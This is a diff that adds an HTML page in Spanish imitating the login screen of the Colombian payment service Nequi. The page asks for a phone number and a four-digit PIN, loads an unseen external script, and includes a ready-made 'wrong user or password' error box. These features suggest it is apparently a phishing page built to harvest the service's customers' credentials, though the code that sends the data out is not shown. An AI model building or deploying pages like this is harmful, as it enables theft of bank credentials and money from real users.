@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <link rel="stylesheet" href="stylesnequ/styles.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagos Nequi</title>
+</head>
+<body>
+    <div id="loading-overlay" style="display: none;">
+        <img src="gif.gif" alt="Cargando" id="loading-gif">
+    </div>
+    
+    <div id="error-box" class="error-box">
+        <div class="error-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <polygon points="12 2 22 20 2 20" fill="white" opacity="0.7"></polygon>
+                <line x1="12" y1="9" x2="12" y2="13" stroke="#ff4d4d"></line>
+                <line x1="12" y1="17" x2="12" y2="17" stroke="#ff4d4d"></line>
+            </svg>
+        </div>
+        <div class="error-message">
+            ¡Ups! Estás ingresando mal tu usuario  o clave, verifica y vuelve a intentarlo
+        </div>
+    </div>
+
+    <img src="log1.png" alt="Nequi" class="logo">
+    <div class="container">
+        <h1>Pagos Nequi</h1>
+        <p>Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.</p>
+        <form id="loginForm" class="input-container">
+            <label for="celular" class="sr-only">Número de celular</label>
+            <input type="tel" id="celular" placeholder="Número de celular" maxlength="10" required aria-required="true">
+            <label for="clave" class="sr-only">Clave</label>
+            <input type="password" id="clave" placeholder="Clave" maxlength="4" required aria-required="true">
+            <button id="entrar" type="submit" disabled>Entra</button>
+            <button id="ahora-no" type="button">Ahora no</button>
+        </form>
+        <p class="forgot-password">¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.</p>
+    </div>
+    <script src="scripts.js/script.js"></script>
+</body>
+</html>
